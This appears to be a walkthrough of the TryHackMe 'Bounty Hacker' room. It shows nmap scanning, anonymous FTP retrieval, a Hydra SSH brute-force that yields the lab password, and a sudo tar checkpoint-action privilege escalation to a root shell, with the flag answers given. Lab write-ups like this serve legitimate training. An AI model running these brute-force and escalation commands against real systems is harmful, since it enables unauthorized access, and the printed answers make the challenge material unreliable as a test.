# [Bounty Hacker](https://tryhackme.com/room/cowboyhacker)

## You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

# Living up to the title.

## You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future!

### Find open ports on the machine

1. Perform a port scan on the target machine to identify open ports and services running

```bash
nmap <TARGET_IP>
```

<img width="648" height="202" alt="SCREEN01" src="https://github.com/user-attachments/assets/28dc6d79-312b-4c19-a83c-15aa6c117875" />

---

### Who wrote the task list?

_Have you visited FTP?_

1. Connect to the FTP service using anonymous login credentials.

2. List available files and download all files from the FTP server.

3. Examine the contents of `task.txt` to find the author's name.

```bash
ftp <TARGET_IP>
anonymous
ls
prompt off
mget *
exit
cat task.txt
```

<img width="1006" height="516" alt="SCREEN02" src="https://github.com/user-attachments/assets/69b7685a-236e-4bb8-820e-778eea6c9c3c" />

<img width="650" height="193" alt="SCREEN03" src="https://github.com/user-attachments/assets/311f8314-00b6-4a66-af39-9650edaf4fdc" />

**Answer:** The name is in `task.txt` file. It is `lin`

---

### What service can you bruteforce with the text file found?

_What is on port 22?_

1. Review the nmap scan results from the first question.

<img width="648" height="202" alt="SCREEN01" src="https://github.com/user-attachments/assets/b33e3439-59b1-4932-95c2-a7f10832ea66" />

**Answer:** Service on port 22 is `SSH`

---

### What is the users password?

_Hydra may be able to help._

1. Use Hydra to perform a brute-force attack on the SSH service.

2. Use the username `lin` (found in task.txt) and the password list from `locks.txt`.

```bash
hydra -l lin -P locks.txt ssh://<TARGET_IP>
```

**Flags explanation:**

- `-l lin`: Specify the username
- `-P locks.txt`: Use the password list file
- `ssh://<TARGET_IP>`: Target the SSH service

<img width="1011" height="253" alt="SCREEN04" src="https://github.com/user-attachments/assets/f3f5c373-1f66-4607-adc7-f0de43919045" />

**Answer:** The password is `RedDr4gonSynd1cat3`

---

### user.txt

1. SSH into the target machine using the credentials obtained (`lin:RedDr4gonSynd1cat3`).

2. List files in the home directory.

3. Read the contents of `user.txt` to obtain the user flag.

```bash
sh lin@<TARGET_IP>
# Enter password: RedDr4gonSynd1cat3
ls
cat user.txt
```

<img width="955" height="541" alt="SCREEN05" src="https://github.com/user-attachments/assets/b6cd23c6-b5ef-42a2-a707-9897a5e4aacd" />

---

### root.txt

1. Check what commands the current user can run with sudo privileges.

```bash
sudo -l
```

<img width="955" height="132" alt="SCREEN06" src="https://github.com/user-attachments/assets/43c2c19c-70f9-4a84-8358-1772062bbc59" />

**Output:** User lin may run `/bin/tar` as root without a password.

2. Search [GTFOBins](https://gtfobins.github.io/) for the `tar` binary to find privilege escalation methods.

3. Use the sudo exploit for tar to spawn a root shell.

4. Verify you have root access and read the root flag.

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
whoami
# Output: root
cat /root/root.txt
```

**Exploit explanation:**

- `sudo tar`: Run tar with root privileges
- `-cf /dev/null /dev/null`: Create an archive (dummy operation)
- `--checkpoint=1`: Set checkpoint interval
- `--checkpoint-action=exec=/bin/sh`: Execute a shell at the checkpoint, spawning a root shell

<img width="922" height="117" alt="SCREEN07" src="https://github.com/user-attachments/assets/45d0786c-220d-4d30-b4cd-570ea34faed8" />
